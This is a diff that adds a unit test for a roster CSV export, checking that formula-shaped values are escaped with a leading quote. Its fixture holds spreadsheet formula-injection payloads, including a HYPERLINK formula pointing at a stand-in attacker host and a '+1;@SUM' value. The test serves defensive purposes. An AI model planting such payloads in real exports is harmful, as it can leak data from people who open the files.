@@ -55,6 +55,31 @@ describe('exportRosterToCsvString', () => {
     const csv = exportRosterToCsvString(solution);
     expect(csv).toContain('"Smith, ""Jo"""');
   });
+
+  it('neutralizes a formula-shaped employee name so Excel/Sheets cannot run it on open', () => {
+    const days = Array.from({ length: 7 }, () => ({ shift_code: 'OFF' }));
+    const solution = {
+      roster_lines: [
+        {
+          line_number: 1,
+          cohort_id: 'C1',
+          assigned_person: '=HYPERLINK("http://evil.example/leak","click")',
+          qualification_tier: '+1;@SUM(A1)',
+          hourly_wage: 17.5,
+          weekly_hours: 40,
+          overtime_hours: 0,
+          estimated_weekly_payroll: 700,
+          days,
+        },
+      ],
+    } as unknown as SolveResponse;
+    const csv = exportRosterToCsvString(solution);
+    // Guarded with a leading single quote, and never present as a raw formula cell.
+    expect(csv).toContain("'=HYPERLINK");
+    expect(csv).toContain("'+1;@SUM(A1)");
+    expect(csv).not.toContain(',=HYPERLINK');
+    expect(csv).not.toContain(',+1;@SUM');
+  });
 });
 
 describe('requests no longer carry the retired X-API-Key header', () => {
